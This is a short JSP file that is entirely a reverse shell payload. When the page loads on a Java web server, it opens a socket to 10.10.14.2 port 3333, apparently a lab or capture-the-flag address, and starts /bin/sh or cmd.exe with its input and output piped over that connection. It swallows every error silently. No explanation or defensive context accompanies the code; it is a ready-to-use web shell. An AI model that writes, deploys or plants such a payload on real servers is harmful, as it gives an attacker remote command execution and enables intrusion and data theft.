<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream xz;
    OutputStream ia;

    StreamConnector( InputStream xz, OutputStream ia )
    {
      this.xz = xz;
      this.ia = ia;
    }

    public void run()
    {
      BufferedReader jv  = null;
      BufferedWriter rrt = null;
      try
      {
        jv  = new BufferedReader( new InputStreamReader( this.xz ) );
        rrt = new BufferedWriter( new OutputStreamWriter( this.ia ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = jv.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rrt.write( buffer, 0, length );
          rrt.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( jv != null )
          jv.close();
        if( rrt != null )
          rrt.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.2", 3333 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
